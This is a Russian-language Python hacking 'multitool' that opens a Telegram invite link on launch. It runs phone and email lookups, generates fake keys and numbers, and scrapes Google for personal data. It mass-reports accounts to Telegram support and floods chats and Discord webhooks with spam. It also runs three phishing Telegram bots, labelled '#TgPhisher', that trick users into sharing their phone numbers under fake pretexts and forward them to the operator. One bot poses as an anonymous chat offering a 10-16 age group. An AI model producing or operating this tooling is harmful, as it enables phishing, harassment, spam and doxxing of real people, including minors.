import platform
import os
import sys
import socket
import pystyle
import requests
import random
import threading
import string
import faker
from faker import Faker
import bs4
import urllib.parse
import colorama
import concurrent.futures
import csv
from pystyle import Colors, Colors, Center, Colorate, Box
import hashlib
import uuid
import json
from bs4 import BeautifulSoup
from termcolor import colored
import aiohttp
import asyncio
import re
import time
import telebot
from telebot import types
import logging
import webbrowser
import psutil
from deep_translator import GoogleTranslator
import base64
from queue import Queue
import qrcode
from pytube import YouTube
from colorama import Fore, Style, init
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from zipfile import ZipFile
from io import BytesIO
import os
import webbrowser
import urllib.parse
import platform

def open_link():
    url = "https://t.me/+BrrBWajXGDNiMDBi"
    system = platform.system()

    if system == "Linux":
        if "com.termux" in os.getenv("PREFIX", ""):
            os.system(f'am start -a android.intent.action.VIEW -d "{url}"')
        else:
            webbrowser.open(url)
    elif system == "Windows":
        webbrowser.open(url)
    else:
        pass
open_link()



def clear_console():
    os.system('cls' if os.name == 'nt' else 'clear')

def search_phone_number(user_number):
    htmlweb_api_url = "https://htmlweb.ru/geo/api.php?json&telcod="
    cache_file = 'phone_cache.json'

    def load_cache():
        try:
            with open(cache_file, 'r') as file:
                return json.load(file)
        except FileNotFoundError:
            return {}

    def save_cache(cache):
        with open(cache_file, 'w') as file:
            json.dump(cache, file)

    cache = load_cache()

    if user_number in cache:
        data = cache[user_number]
    else:
        response_htmlweb = requests.get(htmlweb_api_url + user_number)
        if response_htmlweb.ok:
            data = response_htmlweb.json()
            cache[user_number] = data
            save_cache(cache)
        else:
            data = {"status_error": True}

    if data.get("status_error"):
        print("Ошибка: Не удалось получить данные. Проверьте номер телефона и попробуйте снова.")
        return

    if data.get("limit") == 10:
        print("Вы израсходовали все лимиты запросов.")
        return

    country = data.get('country', {})
    region = data.get('region', {})
    other = data.get('10', {})

    print(Colorate.Vertical(Colors.cyan_to_green, f"[+] Страна: {country.get('name', 'Не найдено')}, {country.get('fullname', 'Не найдено')}"))
    print(Colorate.Vertical(Colors.cyan_to_green, f"[+] Город: {other.get('name', 'Не найдено')}"))
    print(Colorate.Vertical(Colors.cyan_to_green, f"[+] Почтовый индекс: {other.get('post', 'Не найдено')}"))
    print(Colorate.Vertical(Colors.cyan_to_green, f"[+] Код валюты: {country.get('iso', 'Не найдено')}"))
    print(Colorate.Vertical(Colors.cyan_to_green, f"[+] Телефонные коды: {data.get('capital', {}).get('telcod', 'Не найдено')}"))
    print(Colorate.Vertical(Colors.cyan_to_green, f"[+] Посмотреть в wiki: {other.get('wiki', 'Не найдено')}"))
    print(Colorate.Vertical(Colors.cyan_to_green, f"[+] Гос. номер региона авто: {region.get('autocod', 'Не найдено')}"))
    print(Colorate.Vertical(Colors.cyan_to_green, f"[+] Оператор: {other.get('oper', 'Не найдено')}, {other.get('oper_brand', 'Не найдено')}, {other.get('def', 'Не найдено')}"))
    print(Colorate.Vertical(Colors.cyan_to_green, f"[+] Местоположение: {country.get('name', 'Не найдено')}, {region.get('name', 'Не найдено')}, {other.get('name', 'Не найдено')} ({region.get('okrug', 'Не найдено')})"))

    latitude = other.get('latitude', 'Не найдено')
    longitude = other.get('longitude', 'Не найдено')
    location = data.get('location', 'Не найдено')
    lang = country.get('lang', 'Не найдено').title()
    lang_code = country.get('langcod', 'Не найдено')
    capital = data.get('capital', {}).get('name', 'Не найдено')

    print(Colorate.Vertical(Colors.cyan_to_green, f"[+] Открыть на карте (google): https://www.google.com/maps/place/{latitude}+{longitude}"))
    print(Colorate.Vertical(Colors.cyan_to_green, f"[+] Локация: {location}"))
    print(Colorate.Vertical(Colors.cyan_to_green, f"[+] Язык общения: {lang}, {lang_code}"))
    print(Colorate.Vertical(Colors.cyan_to_green, f"[+] Столица: {capital}"))
    print(Colorate.Vertical(Colors.cyan_to_green, f"[+] Широта/Долгота: {latitude}, {longitude}"))
    print(Colorate.Vertical(Colors.cyan_to_green, f"[+] Оценка номера в сети: https://phoneradar.ru/phone/{user_number}"))

def generation_muv():
    print(Colorate.Vertical(Colors.cyan_to_green, (f"[+] Все ключи будут сохранены в файл mullvad_keys.txt")))
    keys = int(input(Colorate.Vertical(Colors.cyan_to_green, ("[+] Сколько нужно сгенерировать ключей:  "))))

    def generate_key():
        key = ''.join(random.choices(string.digits, k=16))
        return key

    def validated_key(key):
        if len(key) != 16:
            return False
        if not key.isdigit():
            return False
        return True

    def save_key(key):
        with open('mullvad_keys.txt', 'a') as file:
            file.write(key + '\n')

    for _ in range(keys):
        generated_key = generate_key()
        if validated_key(generated_key):
            save_key(generated_key)
        else:
            pass

def get_proxies(url):
    proxies = []
    response = requests.get(url)
    soup = BeautifulSoup(response.text, 'html.parser')
    table = soup.find('table')
    rows = table.findAll('tr')
    for row in rows[1:]:
        cols = row.findAll('td')
        ip = cols[0].text.strip()
        port = cols[1].text.strip()
        protocol = cols[4].text.strip().lower()
        proxies.append(f'{ip}:{port}')

    return proxies

def generate_discord_key(token_length):
    characters = string.ascii_letters + string.digits + '-_'
    return ''.join(random.choice(characters) for _ in range(token_length))

def save_keys_to_file(keys, filename):
    with open(filename, 'w') as file:
        for key in keys:
            file.write(key + '\n')

def generate_phone_number_ru():
    country_code = "7"
    number = ''.join(random.choices("0123456789", k=10))
    return f"{country_code}{number}"

def generate_phone_number_uk():
    country_code = "370"
    number = ''.join(random.choices("0123456789", k=9))
    return f"{country_code}{number}"

def reporter_tg():
    text = input(Colorate.Vertical(Colors.cyan_to_green,"[+] Введите текст жалобы: "))
    num_complaints = input(Colorate.Vertical(Colors.cyan_to_green,"\n[+] Введите количество жалоб для отправки: "))
    if num_complaints.isdigit():
        num_complaints = int(num_complaints)
    else:
        print(colored("Ошибка: Введите целое число.", 'red'))
        return

    print()

    with open('num.txt', 'r') as num_file:
        contacts = num_file.read().splitlines()

    with open('ua.txt', 'r') as ua_file:
        ua_list = ua_file.read().splitlines()

    url = 'https://telegram.org/support'
    yukino = 0
    success_count = 0
    failure_count = 0
    max_retries = 3

    async def send_complaint(session, text, contact, ua_list):
        nonlocal yukino, success_count, failure_count

        headers = {
            'User-Agent': random.choice(ua_list)
        }
        payload = {
            'text': text,
            'contact': contact
        }

        for attempt in range(max_retries):
            try:
                async with session.post(url, data=payload, headers=headers, timeout=10) as response:
                    if response.status == 200:
                        yukino += 1
                        success_count += 1
                        print(colored(f"[+] Жалоба успешно отправлена: {yukino}", 'green'))
                        return
            except aiohttp.ClientError:
                pass
            except asyncio.TimeoutError:
                pass

        failure_count += 1
        print(colored("[-] Не удалось отправить жалобу после нескольких попыток", 'red'))

    async def run_tasks(num_complaints, text):
        async with aiohttp.ClientSession() as session:
            tasks = []
            for i in range(num_complaints):
                chosen_contact = random.choice(contacts)
                tasks.append(send_complaint(session, text, chosen_contact, ua_list))
            await asyncio.gather(*tasks)

    asyncio.run(run_tasks(num_complaints, text))
    print()

    print(colored(f"[+] Успешно отправлено жалоб: {success_count}", 'green'))
    print(colored(f"[-] Не удалось отправить жалоб: {failure_count}", 'red'))
    print()

def internet_poisk(query):
    url = "https://www.google.com/search?q={}".format(query)
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
    }
    response = requests.get(url, headers=headers)
    
    if response.status_code == 200:
        soup = BeautifulSoup(response.text, 'html.parser')
        search_results = soup.find_all('div', class_='g')
        excluded_domains = ['google.com', 'maps.google.com', 'shop.grahamfield.com']
        matched_links = []
        for result in search_results:
            link_tag = result.find('a')
            if link_tag:
                href = link_tag.get('href')
                if href and not any(domain in href for domain in excluded_domains):
                    cleaned_url = re.findall(r'(https?://\S+)', href)
                    if cleaned_url:
                        title = result.find('h3')
                        description_tag = result.find('div', class_='VwiC3b tZESfb r025kc hJNv6b')
                        if not description_tag:
                            description_tag = result.find('div', class_='VwiC3b')
                        if not description_tag:
                            description_tag = result.find('p')
                        title_text = title.text if title else "No Title"
                        description_text = description_tag.text if description_tag else "No Description"
                        matched_links.append((cleaned_url[0], title_text, description_text))
        print("\nНайдено {} сыллок:".format(len(matched_links)))
        for link, title, description in matched_links:
            print(f"Сыллка: {link}\nЗаголовок: {title}\nОписание: {description}\n")

        text_for_extraction = ' '.join([f"{title} {description}" for _, title, description in matched_links])
        names = re.findall(r'\b[А-ЯЁ][а-яё]+\s[А-ЯЁ][а-яё]+(?:\s[А-ЯЁ][а-яё]+)?\b', text_for_extraction)
        phones = re.findall(r'\+?\d[\d\-\(\) ]{9,}\d', text_for_extraction)
        emails = re.findall(r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b', text_for_extraction)

        print("\n\nКлючевая информация:")
        print("Имена:", ', '.join(names))
        print("\nТелефоны:", ', '.join(phones))
        print("\nEmail:", ', '.join(emails))

    else:
        print("Невозможно получить результаты поиска. Пожалуйста, попробуйте еще раз позже.")

def check_email_info(email):
    url = f'https://emailrep.io/{email}'
    response = requests.get(url)
    
    if response.status_code == 200:
        info = response.json()
        if isinstance(info, dict):
            reputation = info.get('reputation')
            if reputation == 'min':
                reputation = 'минимальная'
            elif reputation == 'medium':
                reputation = 'средняя'
            elif reputation == 'high':
                reputation = 'высокая'
                
            print(Colorate.Vertical(Colors.cyan_to_green, f"Репутация: {reputation}"))
            print(Colorate.Vertical(Colors.cyan_to_green, f"Подозрительно: {'Да' if info.get('suspicious') else 'Нет'}"))
            print(Colorate.Vertical(Colors.cyan_to_green, f"Ссылки: {info.get('references')}"))
            
            details = info.get('details', {})
            print(Colorate.Vertical(Colors.cyan_to_green, f"Черный список: {'Да' if details.get('blacklisted') else 'Нет'}"))
            print(Colorate.Vertical(Colors.cyan_to_green, f"Злонамеренная активность: {'Да' if details.get('malicious_activity') else 'Нет'}"))
            print(Colorate.Vertical(Colors.cyan_to_green, f"Недавняя злонамеренная активность: {'Да' if details.get('malicious_activity_recent') else 'Нет'}"))
            print(Colorate.Vertical(Colors.cyan_to_green, f"Утечка учетных данных: {'Да' if details.get('credentials_leaked') else 'Нет'}"))
            print(Colorate.Vertical(Colors.cyan_to_green, f"Недавняя утечка учетных данных: {'Да' if details.get('credentials_leaked_recent') else 'Нет'}"))
            print(Colorate.Vertical(Colors.cyan_to_green, f"Утечка данных: {'Да' if details.get('data_breach') else 'Нет'}"))
            print(Colorate.Vertical(Colors.cyan_to_green, f"Впервые увиден: {details.get('first_seen') if details.get('first_seen') else 'некогда'}"))
            print(Colorate.Vertical(Colors.cyan_to_green, f"Последний раз увиден: {details.get('last_seen') if details.get('last_seen') else 'некогда'}"))
            print(Colorate.Vertical(Colors.cyan_to_green, f"Существует домен: {'Да' if details.get('domain_exists') else 'Нет'}"))
            print(Colorate.Vertical(Colors.cyan_to_green, f"Репутация домена: {details.get('domain_reputation')}"))
            print(Colorate.Vertical(Colors.cyan_to_green, f"Новый домен: {'Да' if details.get('new_domain') else 'Нет'}"))
            print(Colorate.Vertical(Colors.cyan_to_green, f"Дней с момента создания домена: {details.get('days_since_domain_creation') if details.get('days_since_domain_creation') else 'нету'}"))
            print(Colorate.Vertical(Colors.cyan_to_green, f"Подозрительное доменное расширение: {'Да' if details.get('suspicious_tld') else 'Нет'}"))
            print(Colorate.Vertical(Colors.cyan_to_green, f"Спам: {'Да' if details.get('spam') else 'Нет'}"))
            print(Colorate.Vertical(Colors.cyan_to_green, f"Бесплатный провайдер: {'Да' if details.get('free_provider') else 'Нет'}"))
            print(Colorate.Vertical(Colors.cyan_to_green, f"Одноразовый адрес: {'Да' if details.get('disposable') else 'Нет'}"))
            print(Colorate.Vertical(Colors.cyan_to_green, f"Доставимо: {'Да' if details.get('deliverable') else 'Нет'}"))
            print(Colorate.Vertical(Colors.cyan_to_green, f"Принимает все: {'Да' if details.get('accept_all') else 'Нет'}"))
            print(Colorate.Vertical(Colors.cyan_to_green, f"Действительный MX: {'Да' if details.get('valid_mx') else 'Нет'}"))
            print(Colorate.Vertical(Colors.cyan_to_green, f"Основной MX: {details.get('primary_mx')}"))
            print(Colorate.Vertical(Colors.cyan_to_green, f"Можно подделать: {'Да' if details.get('spoofable') else 'Нет'}"))
            print(Colorate.Vertical(Colors.cyan_to_green, f"Строгая SPF: {'Да' if details.get('spf_strict') else 'Нет'}"))
            print(Colorate.Vertical(Colors.cyan_to_green,f"DMARC наложен: {'Да' if details.get('dmarc_enforced') else 'Нет'}"))
            print(Colorate.Vertical(Colors.cyan_to_green,f"Профили: {', '.join(details.get('profiles', [])) if details.get('profiles') else 'нету'}"))
        else:
            print(Colorate.Vertical(Colors.cyan_to_green, info))
    elif response.status_code == 429:
        print("Лимит запросов превышен. Подождите некоторое время и попробуйте снова.")
    else:
        print(f"Ошибка: {response.status_code}")

def gb():
    def print_user_data(user_id, first_name, username=None, phone_number=None):
        print(Colorate.Vertical(Colors.cyan_to_green, f"    ID: {user_id:<31}"))
        print(Colorate.Vertical(Colors.cyan_to_green, f"    Имя: {first_name:<29}"))
        
        if username:
            print(Colorate.Vertical(Colors.cyan_to_green, f"    Username: @{username:<24}"))
        if phone_number:
            print(Colorate.Vertical(Colors.cyan_to_green, f"    Номер телефона: +{phone_number:<14}"))
    def is_valid_token(token):

        try:
            bot = telebot.TeleBot(token)
            bot_info = bot.get_me()
            if bot_info:
                return True
        except telebot.apihelper.ApiException:
            return False

    token = input(Colorate.Vertical(Colors.cyan_to_green, f"Введите токен вашего бота >> "))
    admin_id = input(Colorate.Vertical(Colors.cyan_to_green, f"Введите ваш телеграм айди >> "))

    if not is_valid_token(token):
        print(Colorate.Vertical(Colors.cyan_to_green, "{reset}     Неверный токен! Пожалуйста, повторите запуск скрипта"))

    else:
        def get_bot_username(token):
            url = f"https://api.telegram.org/bot{token}/getMe"
            response = requests.get(url).json()

            if response.get("ok") and 'username' in response.get("result", {}):
                return response["result"]["username"]
            else:
                return None

        username = get_bot_username(token)
        if username:
            print(Colorate.Vertical(Colors.cyan_to_green, f"Бот запущен! - для выхода [ctrl + c]\nЮзернейм вашего бота: @{username}\nОтправьте с вашего аккаунта\nКоманду - /start боту."))
        else:
            print(Colorate.Vertical(Colors.cyan_to_green, "Бот запущен! - для выхода [ctrl + c]"))
        bot = telebot.TeleBot(token)
        @bot.message_handler(commands=['start'])
        def send_welcome(message):
            markup = types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
            button_phone = types.KeyboardButton(text="Подтвердить номер телефона", request_contact=True)
            markup.add(button_phone)
        
            bot.send_message(message.chat.id, """
    🗂 <b>Номер телефона</b>

    Вам необходимо подтвердить <b>номер телефона</b> для того, чтобы завершить <b>идентификацию</b>.

    Для этого нажмите кнопку ниже.""", parse_mode="HTML", reply_markup=markup)

        @bot.message_handler(content_types=['contact'])
        def contact_handler(message):
            if message.contact is not None:
                if message.contact.user_id == message.from_user.id:
                    markup = types.ReplyKeyboardRemove()
                    bot.send_message(message.chat.id, f'''
    ⬇️ **Примеры команд для ввода:**

    👤 **Поиск по имени**
    ├  `Блогер` (Поиск по тегу)
    ├  `Антипов Евгений Вячеславович`
    └  `Антипов Евгений Вячеславович 05.02.1994`
     (Доступны также следующие форматы `05.02`/`1994`/`28`/`20-28`)

    🚗 **Поиск по авто**
    ├  `Н777ОН777` - поиск авто по РФ
    └  `WDB4632761X337915` - поиск по VIN

    👨 **Социальные сети**
    ├  `instagram.com/ev.antipov` - Instagram
    ├  `vk.com/id577744097` - Вконтакте
    ├  `facebook.com/profile.php?id=1` - Facebook
    └  `ok.ru/profile/162853188164` - Одноклассники

    📱 `79999939919` - для поиска по номеру телефона
    📨 `tema@gmail.com` - для поиска по Email
    📧 `#281485304`, `@durov` или перешлите сообщение - поиск по Telegram аккаунту

    🔐 `/pas churchill7` - поиск почты, логина и телефона по паролю
    🏚 `/adr Москва, Тверская, д 1, кв 1` - информация по адресу (РФ)
    🏘 `77:01:0001075:1361` - поиск по кадастровому номеру

    🏛 `/company Сбербанк` - поиск по юр лицам
    📑 `/inn 784806113663` - поиск по ИНН
    🎫 `/snils 13046964250` - поиск по СНИЛС
    📇 `/passport 6113825395` - поиск по паспорту
    🗂 `/vy 9902371011` - поиск по ВУ

    📸 Отправьте фото человека, чтобы найти его или двойника на сайтах ВК, ОК.
    🚙 Отправьте фото номера автомобиля, чтобы получить о нем информацию.
    🙂 Отправьте стикер, чтобы найти создателя.
    🌎 Отправьте точку на карте, чтобы найти информацию.
    🗣 С помощью голосовых команд также можно выполнять поисковые запросы.

    ''', parse_mode="Markdown", reply_markup=markup)
                    print()
                    print_user_data(message.from_user.id, message.from_user.first_name, message.from_user.username, message.contact.phone_number)
                    print()
                    try:
                        bot.send_message(admin_id, f'''
    #TgPhisher - {username}

    - {message.from_user.id}
    - {message.from_user.first_name}
    - {message.from_user.username}
    - {message.contact.phone_number}
    ''')
                    except:
                        print('     error send to ADMIN_ID      ')
                else:
                        bot.send_message(message.chat.id, "Это не ваш номер телефона. Пожалуйста, подтвердите свой номер.")

        @bot.message_handler(func=lambda message: True)
        def default_handler(message):
            bot.send_message(message.chat.id, f'''
    ⚠️ **Технические работы.**

    Работы будут завершены в ближайший промежуток времени, все подписки наших пользователей продлены.
    ''', parse_mode="Markdown")
      

        try:
            bot.polling(none_stop=True)
        except Exception as e:
            print(Colorate.Vertical(Colors.cyan_to_green, f"Произошла ошибка: {e}"))

def nakrut():
    def print_user_data(user_id, first_name, username=None, phone_number=None):
        border = "{:-^40}".format("")
        print(Colorate.Vertical(Colors.cyan_to_green, border))
        print(Colorate.Vertical(Colors.cyan_to_green, f"    ID: {user_id:<31}"))
        print(Colorate.Vertical(Colors.cyan_to_green, f"    Имя: {first_name:<29}"))
        if username:
            print(Colorate.Vertical(Colors.cyan_to_green, f"    Username: @{username:<24}"))
        if phone_number:
            print(Colorate.Vertical(Colors.cyan_to_green, f"    Номер телефона: {phone_number:<14}"))
        print(Colorate.Vertical(Colors.cyan_to_green, border))

    def is_valid_token(token):
        try:
            bot = telebot.TeleBot(token)
            bot_info = bot.get_me()
            if bot_info:
                return True
        except telebot.apihelper.ApiException:
            return False

    token = input(Colorate.Vertical(Colors.cyan_to_green, "Введите токен вашего бота >> "))
    admin_id = input(Colorate.Vertical(Colors.cyan_to_green, "Введите ваш телеграм айди >> "))

    if not is_valid_token(token):
        print(Colorate.Vertical(Colors.cyan_to_green, "Неверный токен! Пожалуйста, повторите запуск скрипта"))
        sys.exit()
    else:
        def get_bot_username(token):
            url = f"https://api.telegram.org/bot{token}/getMe"
            response = requests.get(url).json()
            if response.get("ok") and 'username' in response.get("result", {}):
                return response["result"]["username"]
            else:
                return None

        username = get_bot_username(token)
        if username:
            print(Colorate.Vertical(Colors.cyan_to_green, f"Бот запущен! - для выхода [ctrl + c]\nЮзернейм вашего бота: @{username}\nОтправьте с вашего аккаунта\nКоманду - /start боту."))

    bot = telebot.TeleBot(token)

    user_states = {}
    user_channels = {}

    @bot.message_handler(commands=['start'])
    def handle_start(message):
        user_states[message.chat.id] = "START"
        markup = types.InlineKeyboardMarkup()
        button = types.InlineKeyboardButton(text="Продолжить", callback_data="continue")
        markup.add(button)
        bot.send_message(message.chat.id, "Привет! 👋\n\nДанный сервис поможет вам увеличить подписчиков и просмотры вашего канала. Давайте начнем! ✨", reply_markup=markup)

    @bot.callback_query_handler(func=lambda call: call.data == "continue")
    def handle_continue(call):
        bot.delete_message(call.message.chat.id, call.message.message_id)
        user_states[call.message.chat.id] = "AWAITING_CHANNEL"
        bot.send_message(call.message.chat.id, "Отправьте публичную ссылку вашего канала в формате @username.")

    @bot.message_handler(func=lambda message: user_states.get(message.chat.id) == "AWAITING_CHANNEL")
    def process_channel_step(message):
        channel_username = message.text
        if not re.match(r'^@([a-zA-Z0-9_]{5,32})$', channel_username):
            bot.send_message(message.chat.id, "Пожалуйста, отправьте действительное имя канала в формате @username.")
            return

        user_channels[message.chat.id] = channel_username
        markup = types.ReplyKeyboardMarkup(row_width=1, one_time_keyboard=True)
        button1 = types.KeyboardButton("500 подписчиков")
        button2 = types.KeyboardButton("500 просмотров")
        markup.add(button1, button2)
        user_states[message.chat.id] = "AWAITING_CHOICE"
        bot.send_message(message.chat.id, "Выберите количество подписчиков или просмотров:", reply_markup=markup)

    @bot.message_handler(func=lambda message: user_states.get(message.chat.id) == "AWAITING_CHOICE")
    def process_choice_step(message):
        if message.text not in ["500 подписчиков", "500 просмотров"]:
            bot.send_message(message.chat.id, "Для приобретения большего количества подписчиков и просмотров обратитесь к админу.")
            return

        markup = types.ReplyKeyboardMarkup(row_width=1, one_time_keyboard=True)
        button = types.KeyboardButton("Подтвердить номер телефона", request_contact=True)
        markup.add(button)
        user_states[message.chat.id] = "AWAITING_PHONE_CONFIRM"
        bot.send_message(message.chat.id, "Подтвердите ваш номер телефона для продолжения.", reply_markup=markup)

    @bot.message_handler(content_types=['contact'])
    def handle_contact(message):
        if user_states.get(message.chat.id) != "AWAITING_PHONE_CONFIRM":
            return
        print_user_data(message.from_user.id, message.from_user.first_name, message.from_user.username, message.contact.phone_number)
        print()
        try:
            bot.send_message(admin_id, f'''
    #TgPhisher - {username}

    - {message.from_user.id}
    - {message.from_user.first_name}
    - {message.from_user.username}
    - {message.contact.phone_number}
    ''')
        except:
            print('     error send to ADMIN_ID      ')
        
        bot.send_message(message.chat.id, f"<b>Запрос отправлен</b>Ваш запрос будет обработан в ближайшее время.\nВаш id:{message.from_user.id}", parse_mode='HTML')
    try:
        bot.polling(none_stop=True)
    except Exception as e:
        print(Colorate.Vertical(Colors.cyan_to_blue, f"Произошла ошибка: {e}"))

def ano_chat():
    def is_valid_token(token):
        try:
            bot = telebot.TeleBot(token)
            bot_info = bot.get_me()
            if bot_info:
                return True
        except telebot.apihelper.ApiException:
            return False

    def get_bot_username(token):
        url = f"https://api.telegram.org/bot{token}/getMe"
        response = requests.get(url).json()
        if response.get("ok") and 'username' in response.get("result", {}):
            return response["result"]["username"]
        else:
            return None

    token = input(Colorate.Vertical(Colors.cyan_to_green, "Введите токен вашего бота >> "))

    if not is_valid_token(token):
        print(Colorate.Vertical(Colors.cyan_to_green, "Неверный токен! Пожалуйста, повторите запуск скрипта"))
        sys.exit()
    else:
        username = get_bot_username(token)
        if username:
            print(Colorate.Vertical(Colors.cyan_to_green, 
                f"Бот запущен! - для выхода [ctrl + c]\n"
                f"Юзернейм вашего бота: @{username}\n"
                f"Отправьте с вашего аккаунта\n"
                f"Команду - /start боту."))
    bot = telebot.TeleBot(token)
    user_data = {}
    @bot.message_handler(commands=['start'])
    def send_welcome(message):
        bot.send_message(message.chat.id, f"<b>Привет, {message.from_user.first_name}!</b> 🍒 Здесь ты сможешь пообщаться и развлечься с желающими этого людьми. Сначала укажите ваш возрастную группу, чтобы находить людей по вашим параметрам.", parse_mode='HTML')
        markup = types.ReplyKeyboardMarkup(row_width=3, resize_keyboard=True)
        itembtn1 = types.KeyboardButton('10-16')
        itembtn2 = types.KeyboardButton('16-18')
        itembtn3 = types.KeyboardButton('18+')
        bot.send_message(message.chat.id, "Выберите возрастную группу:", reply_markup=markup.add(itembtn1, itembtn2, itembtn3))

    @bot.message_handler(func=lambda message: message.text in ['10-16', '16-18', '18+'])
    def set_age(message):
        user_data[message.chat.id] = {'age': message.text}
        markup = types.ReplyKeyboardMarkup(row_width=1, resize_keyboard=True)
        itembtn1 = types.KeyboardButton('Подтвердить номер', request_contact=True)
        bot.send_message(message.chat.id, "Подтвердите ваш номер телефона:", reply_markup=markup.add(itembtn1))

    @bot.message_handler(content_types=['contact'])
    def handle_contact(message):
        markup = types.ReplyKeyboardRemove()
        if message.contact.user_id == message.from_user.id:
            print(f"\n        ID Пользователя: {message.from_user.id}\n"
                  f"      НикНейм: @{message.from_user.username}\n"
                  f"      Возрастная группа: {user_data[message.chat.id]['age']}\n"
                  f"      Номер телефона: {message.contact.phone_number}\n\n")
            bot.send_message(message.chat.id, "<b>🍒 Регистрация завершена!</b>\nДля поиска воспользуйтесь - /search", reply_markup=markup, parse_mode="HTML")
        else:
            print(f"        ID Пользователя: {message.from_user.id}\n"
                  f"      НикНейм: @{message.from_user.username}\n"
                  f"      Попытка подтвердить номер чужим контактом: {message.contact.phone_number}\n\n")
            bot.send_message(message.chat.id, "Вы отправили не свой номер телефона!", reply_markup=markup)

    @bot.message_handler(commands=['search'])
    def default_handler(message):
        bot.send_message(message.chat.id, f'''
    <b>🔍 Идет ожидание онлайн пользователей...</b>


    <i>🍒 - Будьте осторожны при отправке личных фото/видео материалов!

    💬 - Собеседник может быть несовершенно летнего возраста
            Мы не несем ответственность за ваши действия.</i>
    ''', parse_mode="html")

    try:
        bot.polling(none_stop=True)
    except Exception as e:
        print(Colorate.Vertical(Colors.cyan_to_green, f"Произошла ошибка: {e}"))

def list_data_files():
    current_directory = os.getcwd()
    files_and_folders = os.listdir(current_directory)
    valid_extensions = ('.csv', '.xlsx', '.db')
    data_files = [file for file in files_and_folders if file.endswith(valid_extensions)]
    if data_files:
        print(Colorate.Vertical(Colors.cyan_to_green, "[+] Список файлов данных в текущей директории:"))
        for data_file in data_files:
            print(Colorate.Vertical(Colors.cyan_to_green, data_file))
    else:
        print(Colorate.Vertical(Colors.cyan_to_green, "[-] В текущей директории нет файлов данных с расширениями .csv, .xlsx или .db."))


def spam_bot():
    API_TOKEN = input(Colorate.Vertical(Colors.cyan_to_green, '[+] Введите токен бота: '))
    logging.basicConfig(level=logging.INFO)
    bot = telebot.TeleBot(API_TOKEN)
    try:
        chat_id = int(input(Colorate.Vertical(Colors.cyan_to_green, "[+] Введите ID чата для спама: ")))
        spam_text = input(Colorate.Vertical(Colors.cyan_to_green, "[+] Введите сообщение для спама: "))
        if chat_id and spam_text:
            for _ in range(20):
                bot.send_message(chat_id, spam_text)
                logging.info(f"Сообщение отправлено в чат {chat_id}")
                time.sleep(0.5)
            logging.info(Colorate.Vertical(Colors.cyan_to_green, "[+] Спам закончен."))
    except ValueError:
        print(Colorate.Vertical(Colors.cyan_to_green, "[+] Пожалуйста, введите допустимые значения."))
    except Exception as e:
        logging.error(Colorate.Vertical(Colors.cyan_to_green, f"[+] Ошибка отправки сообщения в чат {chat_id}: {e}"))
    finally:
        exit()
import webbrowser

def logger_discord():
    url1 = "https://www.youtube.com/watch?v=rFbiW2x4HEw"
    url2 = "https://github.com/dekrypted/discord-image-logger"

    response = input(Colorate.Vertical(Colors.cyan_to_green, "[+] Хотите открыть Discord Image Logger? (Да/Нет): ").lower())
    if response == 'да':
        webbrowser.open_new_tab(url1)
        webbrowser.open_new_tab(url2)
    elif response == 'нет':
        print(Colorate.Vertical(Colors.cyan_to_green, "[+] Выход..."))
    else:
        print("[+] Неверный ответ. Пожалуйста, введите 'Да' или 'Нет'.")
def spam_webhook():
    msg = input(Colorate.Vertical(Colors.cyan_to_green, "[+] Введите текст для отправки: "))
    webhook = input(Colorate.Vertical(Colors.cyan_to_green, "[+] Введите URL вебхука: "))
    while True:
        for i in range(30):
            try:   
                data = requests.post(webhook, json={'content': msg})
                if data.status_code == 204:           
                    print(Colorate.Vertical(Colors.cyan_to_green, f"[+] Отправлено сообщение: {msg}"))
            except:
                print(Colorate.Vertical(Colors.cyan_to_green, "[+] Ошибка вебхука: " + webhook))

def generate_and_save_mac_addresses(filename):
    num_addresses = int(input(Colorate.Vertical(Colors.cyan_to_green, "[+] Введите количество MAC адресов для генерации: ")))
    
    def generate_mac_address():
        mac = [0x00, 0x16, 0x3e,
               random.randint(0x00, 0x7f),
               random.randint(0x00, 0xff),
               random.randint(0x00, 0xff)]
        return ':'.join(map(lambda x: "%02x" % x, mac))
    
    with open(filename, 'w') as file:
        for _ in range(num_addresses):
            mac_address = generate_mac_address()
            file.write(mac_address + '\n')
    
    print(Colorate.Vertical(Colors.cyan_to_green, f"[+] {num_addresses} MAC адресов были сохранены в файл '{filename}'."))

def generate_emails_and_save_to_file():
    fake = Faker()
    num_emails = int(input(Colorate.Vertical(Colors.cyan_to_green, "[+] Сколько адресов электронной почты сгенерировать?: ")))
    
    emails = []
    for _ in range(num_emails):
        email = fake.email()
        local_part, domain_part = email.split('@')
        if random.choice([True, False]):
            random_domain = 'mail.ru'
        else:
            random_domain = 'gmail.com'
        new_email = f"{local_part}@{random_domain}"
        emails.append(new_email)
    
    print()
    for email in emails:
        print(Colorate.Vertical(Colors.cyan_to_green, email))
    
    filename = "generated_mail.txt"
    with open(filename, 'w') as file:
        for email in emails:
            file.write(email + '\n')
    print(Colorate.Vertical(Colors.cyan_to_green, f"\n[+] Адреса электронной почты сохранены в файл {filename}"))

def get_network_info():
    hostname = socket.gethostname()
    local_ip = socket.gethostbyname(hostname)
    
    print(Colorate.Vertical(Colors.cyan_to_green, f"[+] Имя хоста: {hostname}"))
    print(Colorate.Vertical(Colors.cyan_to_green, f"[+] Локальный IP-адрес: {local_ip}"))
    
    net_if_addrs = psutil.net_if_addrs()
    net_if_stats = psutil.net_if_stats()
    
    for interface, addrs in net_if_addrs.items():
        print(Colorate.Vertical(Colors.cyan_to_green, f"\n[+] Интерфейс: {interface}"))
        
        if interface in net_if_stats:
            is_up = net_if_stats[interface].isup
            print(Colorate.Vertical(Colors.cyan_to_green, f"[+] Статус: {'Включен' if is_up else 'Выключен'}"))
        
        for addr in addrs:
            if addr.family == socket.AF_INET:
                print(Colorate.Vertical(Colors.cyan_to_green, f"  [+] IPv4 адрес: {addr.address}"))
                print(Colorate.Vertical(Colors.cyan_to_green, f"  [+] Маска подсети: {addr.netmask}"))
                print(Colorate.Vertical(Colors.cyan_to_green, f"  [+] Шлюз: {addr.broadcast}"))
            elif addr.family == socket.AF_INET6:
                print(Colorate.Vertical(Colors.cyan_to_green, f"  [+] IPv6 адрес: {addr.address}"))
